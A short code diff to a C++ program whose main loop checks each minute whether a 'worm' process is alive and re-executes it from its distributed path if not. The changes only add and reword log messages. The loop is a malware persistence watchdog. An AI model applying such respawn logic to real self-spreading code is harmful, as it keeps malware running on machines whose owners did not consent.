@@ -57,8 +57,9 @@ int main() {
     std::cout << "Timer starts." << std::endl;
     int pid = -1;
     while (1) {
+        std::cout << "Checking the worm with PID " << pid << " ." << std::endl;
         if (pid < 0 || !isWormRunning(pid)) {
-            std::cout << "Worm not running." << std::endl;
+            std::cout << "Worm not running. Trying to execute the worm." << std::endl;
             std::string path = isWormDistributed();
             if (path == "") {
                 std::cout << "Failed to execute the worm." << std::endl;
@@ -70,7 +71,8 @@ int main() {
                 break;
             }
             std::cout << "Worm executed. PID " << pid << " ." << std::endl;
-        } else {
+        } 
+        else {
             std::cout << "Worm running." << std::endl;
         }
         usleep(MINUTE);
